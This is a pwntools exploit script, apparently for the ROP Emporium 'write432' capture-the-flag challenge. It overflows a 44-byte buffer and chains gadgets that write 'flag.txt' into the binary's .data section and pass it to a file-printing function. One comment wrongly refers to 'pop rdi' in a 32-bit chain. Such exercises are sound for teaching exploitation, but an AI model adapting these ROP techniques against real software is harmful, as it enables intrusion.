from pwn import *
#from pwnlib import *
# we can use the .data section to write flag.txt since it is writable and has 8 bytes at 0x0804a018

# can do that with the useful gadget and pop rdi

# chaining with it with ret to the 0x8048538 with the .data as first param
buf = b'A'*44
buf += p32(0x080485aa)
buf += p32(0x0804a018)
buf += b'flag'
buf += p32(0x08048543)
buf += p32(0x080485aa)
buf += p32(0x0804a01c)
buf += b'.txt'
buf += p32(0x08048543)
buf += p32(0x080483d0)
buf += p32(0x0804a018)*3

p = process("./write432")
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
#gdb.attach(p)
p.sendline(buf)
p.interactive()
p.close()
